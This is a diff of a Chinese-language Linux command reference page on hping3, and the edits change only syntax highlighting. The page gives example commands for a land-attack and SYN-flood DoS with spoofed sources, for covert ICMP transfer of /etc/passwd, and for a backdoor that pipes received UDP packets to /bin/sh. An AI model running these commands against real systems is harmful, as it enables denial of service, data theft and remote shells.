@@ -10,7 +10,7 @@
     <meta name="keywords" content="Linux,Command,命令大全,Linux命令手册,hping3,测试网络及主机的安全">
     <title>hping3 命令，Linux hping3 命令详解：测试网络及主机的安全 -  Linux 命令搜索引擎</title>
     <link rel="shortcut icon" href="../img/favicon.ico">
-    <link rel="stylesheet" type="text/css" href="../css/index.css?v=1584350098953">
+    <link rel="stylesheet" type="text/css" href="../css/index.css?v=1584405944474">
 </head>
 <body>
 <a href="https://github.com/jaywcjlove/linux-command" target="_blank" class="github-corner"> <svg viewBox="0 0 250 250"><!-- kenny wang <wowohoo@qq.com> https://github.com/jaywcjlove --> <title>logo</title> <desc>Linux Command Logo. https://github.com/jaywcjlove</desc><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg> </a>
@@ -46,7 +46,7 @@
 <span class="token function">ln</span> -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h
 <span class="token function">wget</span> http://www.hping.org/hping3-20051105.tar.gz
 <span class="token function">tar</span> zxvf hping3-20051105.tar.gz
-<span class="token function">cd</span> hping3-20051105
+<span class="token builtin class-name">cd</span> hping3-20051105
 ./configure
 <span class="token function">make</span>
 <span class="token function">make</span> <span class="token function">install</span></code></pre>
@@ -57,7 +57,7 @@
 -n -nmeric 数字输出，象征性输出主机地址。
 -q -quiet 退出。
 -I --interface interface name 无非就是eth0之类的参数。
--v --verbose 显示很多信息，TCP回应一般如：len<span class="token operator">=</span>46 ip<span class="token operator">=</span>192.168.1.1 flags<span class="token operator">=</span>RADF seq<span class="token operator">=</span>0 ttl<span class="token operator">=</span>255 id<span class="token operator">=</span>0 win<span class="token operator">=</span>0 rtt<span class="token operator">=</span>0.4ms tos<span class="token operator">=</span>0 iplen<span class="token operator">=</span>40 seq<span class="token operator">=</span>0 ack<span class="token operator">=</span>1380893504 sum<span class="token operator">=</span>2010 urp<span class="token operator">=</span>0
+-v --verbose 显示很多信息，TCP回应一般如：len<span class="token operator">=</span><span class="token number">46</span> <span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1 <span class="token assign-left variable">flags</span><span class="token operator">=</span>RADF <span class="token assign-left variable">seq</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">255</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">win</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">rtt</span><span class="token operator">=</span><span class="token number">0</span>.4ms <span class="token assign-left variable">tos</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">iplen</span><span class="token operator">=</span><span class="token number">40</span> <span class="token assign-left variable">seq</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">ack</span><span class="token operator">=</span><span class="token number">1380893504</span> <span class="token assign-left variable">sum</span><span class="token operator">=</span><span class="token number">2010</span> <span class="token assign-left variable">urp</span><span class="token operator">=</span><span class="token number">0</span>
 -D --debug 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.）
 -z --bind 快捷键的使用。
 -Z --unbind 消除快捷键。
@@ -72,54 +72,54 @@
 -r --rel 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。
 -F --FRAG 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是16字节。
 -x --morefrag 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。
--y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。
--G --fragoff fragment offset value <span class="token keyword">set</span> the fragment offset
+-y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU <span class="token environment constant">PATH</span> DISCOVERY。
+-G --fragoff fragment offset value <span class="token builtin class-name">set</span> the fragment offset
 -m --mtu mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。
 -G --rroute 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。
--C --ICMPTYPE <span class="token function">type</span> 指定ICMP类型，缺省是ICMP <span class="token keyword">echo</span> REQUEST。
+-C --ICMPTYPE <span class="token builtin class-name">type</span> 指定ICMP类型，缺省是ICMP <span class="token builtin class-name">echo</span> REQUEST。
 -K --ICMPCODE CODE 指定ICMP代号，缺省0。
 --icmp-ipver 把IP版本也插入IP头。
 --icmp-iphlen 设置IP头的长度，缺省为5（32字节）。
 --icmp-iplen 设置IP包长度。
---icmp-ipid 设置ICMP报文IP头的ID，缺省是RANDOM。
+--icmp-ipid 设置ICMP报文IP头的ID，缺省是<span class="token environment constant">RANDOM</span>。
 --icmp-ipproto 设置协议的，缺省是TCP。
 -icmp-cksum 设置校验和。
--icmp-ts <span class="token function">alias</span> <span class="token keyword">for</span> --icmptype 13 <span class="token punctuation">(</span>to send ICMP timestamp requests<span class="token punctuation">)</span>
---icmp-addr Alias <span class="token keyword">for</span> --icmptype 17 <span class="token punctuation">(</span>to send ICMP address mask requests<span class="token punctuation">)</span>
--s --baseport <span class="token function">source</span> port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。
+-icmp-ts <span class="token builtin class-name">alias</span> <span class="token keyword">for</span> --icmptype <span class="token number">13</span> <span class="token punctuation">(</span>to send ICMP timestamp requests<span class="token punctuation">)</span>
+--icmp-addr Alias <span class="token keyword">for</span> --icmptype <span class="token number">17</span> <span class="token punctuation">(</span>to send ICMP address mask requests<span class="token punctuation">)</span>
+-s --baseport <span class="token builtin class-name">source</span> port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。
 -p --deskport <span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span>desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。
 --keep 上面说过了。
 -w --win 发的大小和windows一样大，64BYTE。
--O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / 4.
+-O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / <span class="token number">4</span>.
 -m --tcpseq 设置TCP序列数。
 -l --tcpck 设置TCP ack。
 -Q --seqnum 搜集序列号的，这对于你分析TCP序列号有很大作用。</code></pre>
 <h3 id="hping3功能">Hping3功能</h3><p>Hping3主要有以下典型功能应用：</p>
 <h3 id="#  防火墙测试">#  防火墙测试</h3><p>使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：<a href="http://0daysecurity.com/articles/hping3_examples.html">http://0daysecurity.com/articles/hping3_examples.html</a></p>
 <p>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p>
-<pre><code class="language-shell">hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10</code></pre>
+<pre><code class="language-shell">hping3 -S  -c <span class="token number">1000000</span> -a <span class="token number">10.10</span>.10.10 -p <span class="token number">21</span> <span class="token number">10.10</span>.10.10</code></pre>
 <h3 id="# 端口扫描"># 端口扫描</h3><p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p>
-<pre><code class="language-shell">hping3 -I eth0  -S 192.168.10.1 -p 80</code></pre>
+<pre><code class="language-shell">hping3 -I eth0  -S <span class="token number">192.168</span>.10.1 -p <span class="token number">80</span></code></pre>
 <p>其中<code>-I eth0</code>指定使用eth0端口，<code>-S</code>指定TCP包的标志位SYN，<code>-p 80</code>指定探测的目的端口。</p>
 <p>hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</p>
 <h3 id="# idle扫描"># Idle扫描</h3><p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p>
 <p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p>
 <h3 id="# 拒绝服务攻击"># 拒绝服务攻击</h3><p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p>
-<pre><code class="language-shell">hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000</code></pre>
+<pre><code class="language-shell">hping3 -I eth0 -a192.168.10.99 -S <span class="token number">192.168</span>.10.33 -p <span class="token number">80</span> -i u1000</code></pre>
 <p>其他攻击如smurf、teardrop、land attack等也很容易构建出来。</p>
 <h3 id="# 文件传输"># 文件传输</h3><p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p>
-<pre><code class="language-shell">hping3 192.168.1.159--listen signature --safe  --icmp</code></pre>
+<pre><code class="language-shell">hping3 <span class="token number">192.168</span>.1.159--listen signature --safe  --icmp</code></pre>
 <p>监听ICMP包中的签名，根据签名解析出文件内容。</p>
 <p>在发送端使用签名打包的ICMP包发送文件：</p>
-<pre><code class="language-shell">hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd</code></pre>
+<pre><code class="language-shell">hping3 <span class="token number">192.168</span>.1.108--icmp ?d <span class="token number">100</span> --sign signature --file /etc/passwd</code></pre>
 <p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p>
 <h3 id="# 木马功能"># 木马功能</h3><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</p>
 <p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p>
 <p>在木马启动端：</p>
-<pre><code class="language-shell">hping3 192.168.10.66--listen signature --safe --udp -p 53 <span class="token operator">|</span> /bin/sh</code></pre>
+<pre><code class="language-shell">hping3 <span class="token number">192.168</span>.10.66--listen signature --safe --udp -p <span class="token number">53</span> <span class="token operator">|</span> /bin/sh</code></pre>
 <p>在远程控制端：</p>
-<pre><code class="language-shell"><span class="token keyword">echo</span> <span class="token function">ls</span> <span class="token operator">></span>test.cmd
-hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd</code></pre>
+<pre><code class="language-shell"><span class="token builtin class-name">echo</span> <span class="token function">ls</span> <span class="token operator">></span>test.cmd
+hping3 <span class="token number">192.168</span>.10.44 -p53 -d <span class="token number">100</span> --udp --sign siganature --file ./test.cmd</code></pre>
 <p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p>
 <p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>
 <!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->
@@ -144,7 +144,7 @@ hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd</code
 </div>
 <script>
 var _hmt = _hmt || []; (function() {var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?a542c0213a9aa8ae29fccdc8a18b91ef"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script>
-<script type="text/javascript" src="../js/dt.js?v=1584350098954"></script>
-<script type="text/javascript" src="../js/index.js?v=1584350098954"></script>
+<script type="text/javascript" src="../js/dt.js?v=1584405944475"></script>
+<script type="text/javascript" src="../js/index.js?v=1584405944475"></script>
 </body>
 </html>
